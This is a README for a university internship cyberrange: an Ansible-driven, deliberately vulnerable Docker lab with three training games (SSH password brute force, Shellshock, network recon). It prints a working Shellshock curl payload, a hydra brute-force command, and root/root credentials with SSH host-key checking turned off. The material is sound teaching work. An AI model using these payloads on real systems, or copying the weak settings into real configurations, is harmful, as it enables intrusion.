# WMG Cyberrange Internship

## Project Overview & Research Context

This repository is the working output of a summer internship project with
WMG (Warwick Manufacturing Group), University of Warwick. The goal is to
build a small, self-contained, reproducible "cyberrange": a local Docker
target machine deliberately configured with well-known, real vulnerability
classes, driven entirely by Ansible so the whole environment can be torn
down and rebuilt from source at any time.

Each vulnerability is packaged as a self-contained **game** under `games/`,
with a student-facing briefing, a set of progressive hints, and a full
instructor solution guide so the same repository can be used both for
self-directed practice and for supervised teaching sessions.

The three games currently implemented:

1. **SSH Weak Password Attack** : dictionary/brute-force attacks against a
   weak account password.
2. **Shellshock (CVE-2014-6271)** : a real, historically accurate remote
   code execution bug in `bash`, exploited through a CGI script.
3. **Network Reconnaissance** : enumerating multiple open services and
   telling real leads apart from decoys.

## Architecture

```
                         Host machine (Windows 11 + WSL2 Ubuntu)
  ┌───────────────────────────────────────────────────────────────────┐
  │  Docker Desktop                                                    │
  │                                                                     │
  │   ┌──────────────────────┐   docker network:      ┌──────────────┐│
  │   │   cyberrange-target   │◄──── cyberrange-net ──►│cyberrange-   ││
  │   │  (Ubuntu 22.04 +      │                        │  attacker    ││
  │   │   openssh-server)     │                        │(Kali + hydra,││
  │   │                        │                        │ nmap, curl…) ││
  │   │  port 2222 ─► host    │                        └──────────────┘│
  │   │  (published for SSH)  │                                         │
  │   └──────────▲────────────┘                                         │
  │              │ SSH (ansible_connection=ssh)                         │
  └──────────────┼────────────────────────────────────────────────────┘
                  │
         ┌────────┴─────────┐
         │  Ansible control  │   inventory/hosts.ini
         │  (WSL Ubuntu,      │   games/*/setup.yml
         │   ansible-core     │
         │   2.21.1)          │
         └────────────────────┘
```

- **`cyberrange-target`** is the single "victim" machine. All three games'
  playbooks configure this one container, layering their vulnerabilities on
  top of each other (this mirrors a realistic pentest target that has more
  than one problem at once).
- **`cyberrange-attacker`** is an optional, disposable toolbox container
  used to run `hydra`, `nmap`, `curl`, etc. against the target without
  installing anything on the host. It sits on the same Docker network as
  the target so it can reach it directly by container name.
- **Ansible** runs from the WSL host and drives the target exclusively over
  SSH on its published port `2222`.

## Directory Layout

```
wmg-cyberrange-internship/
├── README.md                       <- this file
├── docker/
│   ├── Dockerfile.target           <- builds the vulnerable target image
│   └── Dockerfile.attacker         <- builds the attacker toolbox image
├── inventory/
│   └── hosts.ini                   <- Ansible inventory for the target
├── games/
│   ├── ssh-weak-password/
│   │   ├── setup.yml               <- Ansible playbook for this game
│   │   ├── files/wordlist.txt      <- password wordlist used by hydra
│   │   ├── briefing.md             <- student-facing scenario
│   │   ├── hints.md                <- progressive hints
│   │   └── solution.md             <- full instructor walkthrough
│   ├── shellshock/
│   │   ├── setup.yml
│   │   ├── files/status.cgi
│   │   ├── briefing.md
│   │   ├── hints.md
│   │   └── solution.md
│   └── network-recon/
│       ├── setup.yml
│       ├── files/{banner_service.py.j2, ftp_readme.txt, decoy_index.html}
│       ├── briefing.md
│       ├── hints.md
│       └── solution.md
└── research-logs/
    └── research-log.md             <- chronological build log
```

## Prerequisites

- Windows 11 with WSL2 and a Linux distribution installed (this project
  was built against Ubuntu on WSL2).
- Docker Desktop, with the WSL2 integration enabled for your distro.
- Inside WSL:
  - `ansible-core` (this project was built and tested against `2.21.1`)
  - `sshpass` (for password-based SSH testing/verification)
  - `git` (optional, if you clone rather than copy this repo)

You do **not** need `hydra` or `nmap` installed on the host : both are
provided via the `cyberrange-attacker` Docker image (see below), so no
`sudo`/host package installs are required to run or verify the games.

## Installation

```bash
git clone <this-repo-url> wmg-cyberrange-internship
cd wmg-cyberrange-internship
```

(Or copy the files directly if you already have them.)

## Docker Setup

Build the two images and the target container:

```bash
# Build the vulnerable target base image (Ubuntu 22.04 + openssh-server)
docker build -t cyberrange-target-base -f docker/Dockerfile.target .

# Build the attacker toolbox image (Kali + hydra, nmap, curl, ftp, nc)
docker build -t cyberrange-attacker -f docker/Dockerfile.attacker .

# Create a shared network so the attacker container can reach the target
# by name on every port, not just the ones published to the host
docker network create cyberrange-net

# Run the target, publishing SSH on host port 2222
docker run -d --name cyberrange-target -p 2222:22 --cap-add=NET_ADMIN cyberrange-target-base
docker network connect cyberrange-net cyberrange-target
```

**Why a custom-built target image instead of a stock "vulnerable OS" image?**
See `research-logs/research-log.md`, Entries 1–3: `ansible-core 2.21.1`
requires Python **3.9+** on managed nodes, but the originally-planned
`rastasheep/ubuntu-sshd:18.04` image only ships Python 3.6.5 and has no
upgrade path past 3.8 in its own package repositories. Building from
`ubuntu:22.04` (Python 3.10 by default) solves this with a ~15 second build
instead of compiling a toolchain from source.

**Rebuilding the target from scratch:** because it's ephemeral and its SSH
host key changes on every rebuild, destroy and recreate it with:

```bash
docker rm -f cyberrange-target
docker run -d --name cyberrange-target -p 2222:22 --cap-add=NET_ADMIN cyberrange-target-base
docker network connect cyberrange-net cyberrange-target
```

## Inventory

`inventory/hosts.ini`:

```ini
[cyberrange]
target ansible_host=127.0.0.1 ansible_port=2222 ansible_user=root ansible_password=root \
  ansible_ssh_common_args='-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null' \
  ansible_python_interpreter=/usr/bin/python3
```

Notes:
- `ansible_password=root` matches the root password baked into
  `docker/Dockerfile.target` : this is a local, disposable training
  container, not a production credential.
- `UserKnownHostsFile=/dev/null` is required because the container
  generates a new SSH host key on every rebuild; without it, SSH refuses
  to connect after the first rebuild (see research log Entry 3).
- `ansible_python_interpreter=/usr/bin/python3` explicitly targets Python
  3.10 on the container, rather than relying on Ansible's interpreter
  auto-discovery.

## Ansible

Each game is a single, standalone playbook (`games/<game>/setup.yml`) that
targets the `cyberrange` group defined in the inventory. Playbooks are
designed to be:

- **Idempotent** : safe to re-run any number of times; a second run always
  reports `changed=0` for that game.
- **Independent** : each game installs everything it needs itself (even if
  another game already installed the same package, e.g. `apache2`), so any
  single game can be run on its own.
- **Composable** : all three can run against the same target container
  without conflicting (verified in research log Entry 11).

Test connectivity at any time with:

```bash
ansible -i inventory/hosts.ini cyberrange -m ping
```

## Running the Games

```bash
ansible-playbook -i inventory/hosts.ini games/ssh-weak-password/setup.yml
ansible-playbook -i inventory/hosts.ini games/shellshock/setup.yml
ansible-playbook -i inventory/hosts.ini games/network-recon/setup.yml
```

Each game's `briefing.md` is the student-facing starting point; `hints.md`
gives progressive nudges; `solution.md` is the full instructor walkthrough
with exact commands and expected output.

### Expected outputs

**Game 1 : SSH Weak Password Attack**
```
ansible-playbook ... -> ok=7 changed=4 failed=0   (first run)
ansible-playbook ... -> ok=7 changed=0 failed=0   (re-run)
hydra -l student -P games/ssh-weak-password/files/wordlist.txt ssh://127.0.0.1 -s 2222
  -> [22][ssh] host: ... login: student password: password123
ssh -p 2222 student@127.0.0.1 'cat flag.txt'
  -> WMG{ssh_w3ak_p4ssw0rds_are_never_ok}
```

**Game 2 : Shellshock (CVE-2014-6271)**
```
ansible-playbook ... -> ok=13 changed=10 failed=0   (first run)
ansible-playbook ... -> ok=11 changed=0 failed=0    (re-run)
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /opt/flag.txt' \
  http://127.0.0.1/cgi-bin/status.cgi
  -> WMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}
```

**Game 3 : Network Reconnaissance**
```
ansible-playbook ... -> ok=15 changed=10 failed=0 ignored=1   (first run)
ansible-playbook ... -> ok=13 changed=0 failed=0 skipped=4    (re-run)
nmap -sV -p21,80,8888 127.0.0.1
  -> 21/tcp ftp, 80/tcp http (both decoys), 8888/tcp unknown/banner service
nc 127.0.0.1 8888
  -> WMG{r3c0n_1s_m0r3_th4n_just_p0rt_sc4nning}
```

(The single "ignored" failure on Game 3's first run is expected: it's a
`wait_for` pre-check confirming the banner service isn't already running,
which fails by design before the service has ever been started.)

### Using the attacker toolbox

```bash
# Any tool, against the target by container name on the shared network:
docker run --rm --network cyberrange-net cyberrange-attacker <command...>

# Example: hydra against Game 1, using the wordlist shipped in this repo
docker run --rm --network cyberrange-net \
  -v "$(pwd)/games/ssh-weak-password/files:/wordlists:ro" \
  cyberrange-attacker hydra -l student -P /wordlists/wordlist.txt ssh://cyberrange-target
```

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `ansible ... -m ping` fails with a Python `SyntaxError` about `from __future__ import annotations` | Target's Python is too old for the installed `ansible-core` | Confirm the target is running the custom `cyberrange-target-base` image (Python 3.10), not an older stock image |
| `ansible ... -m ping` fails with `Ansible requires Python 3.9 or newer` | Same as above | Same as above |
| SSH connection fails with `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!` | Container was rebuilt (new SSH host key) and the old key is cached | Ensure `inventory/hosts.ini` has `-o UserKnownHostsFile=/dev/null` in `ansible_ssh_common_args` |
| A `command`/`shell` task in a playbook hangs forever | The command doesn't self-daemonize (e.g. `vsftpd` on this image runs in the foreground) | Use `async: 86400, poll: 0` to launch it fire-and-forget, as done in `games/network-recon/setup.yml` |
| Anonymous FTP connects but every transfer fails | `secure_chroot_dir` (`/var/run/vsftpd/empty`) doesn't exist : normally created by `systemd-tmpfiles` at boot, which never runs in this container | Ensure the directory is created explicitly (already handled in `games/network-recon/setup.yml`) |
| A `command` task with `creates:` re-runs every time despite the target existing | The actual file created doesn't match the assumed name (e.g. `a2enmod cgi` creates `cgid.load`, not `cgi.load`, under a threaded MPM) | Check what the command actually created with `ls` before writing the `creates:` guard |
| `sudo` fails with "interactive authentication is required" | No passwordless sudo configured for the current shell/session | Avoid host-level installs entirely : use the `cyberrange-attacker` container instead |

## Learning Objectives

**Game 1 : SSH Weak Password Attack**
- Understand why password strength and account lockout policies matter.
- Practice using `hydra` for credential brute-forcing against a real
  service.
- Recognize that file permissions, not obscurity, are what actually
  protects data after a compromise.

**Game 2 : Shellshock (CVE-2014-6271)**
- Understand how CGI exposes HTTP headers as environment variables, and
  why that's dangerous when the interpreter has a parsing bug.
- Practice crafting an HTTP header-based exploit with `curl`.
- Understand the real-world lesson: patching the OS isn't enough if a
  legacy script is pinned to an old, unpatched interpreter.

**Game 3 : Network Reconnaissance**
- Practice comprehensive port scanning (not just default top-N ports).
- Practice service/version fingerprinting with `nmap -sV`.
- Build the judgment to distinguish real leads from decoys rather than
  assuming every open port is significant.

## Future Improvements

- Add a fourth game covering a web application vulnerability class (e.g.
  SQL injection or a vulnerable file upload) to round out the OWASP-style
  coverage.
- Add an Ansible-driven teardown/reset playbook per game (currently reset
  is done by destroying and rebuilding the whole container).
- Parameterize flags (e.g. per-student unique flags) for use in a
  classroom setting with automated grading.
- Add a `Vagrantfile`/cloud alternative to the Docker-based setup for
  environments where Docker Desktop isn't available.
- Wire up CI (e.g. a scheduled GitHub Actions job) to rebuild the target
  and re-run every game's playbook automatically, catching regressions
  from upstream package updates (e.g. a future Ubuntu 22.04 point release
  changing `vsftpd`'s default config).
